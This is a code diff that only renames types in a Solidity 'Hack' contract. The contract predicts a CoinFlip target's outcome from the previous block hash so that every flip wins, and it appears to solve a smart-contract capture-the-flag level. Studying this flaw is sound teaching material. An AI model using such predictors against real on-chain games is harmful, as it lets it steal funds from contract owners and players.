@@ -1,14 +1,13 @@
 pragma solidity ^0.8;
 
 interface ICoinFlip {
-    function consecutiveWins() external view returns (uint);
+    function consecutiveWins() external view returns (uint256);
     function flip(bool) external returns (bool);
 }
 
 contract Hack {
     ICoinFlip private immutable target;
-    uint private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-
+    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(address _target) {
         target = ICoinFlip(_target);
@@ -21,9 +20,9 @@ contract Hack {
     }
 
     function _guess() private view returns (bool) {
-        uint blockValue = uint256(blockhash(block.number - 1));
+        uint256 blockValue = uint256(blockhash(block.number - 1));
 
-        uint coinFlip = blockValue / FACTOR;
+        uint256 coinFlip = blockValue / FACTOR;
         return coinFlip == 1 ? true : false;
     }
 }
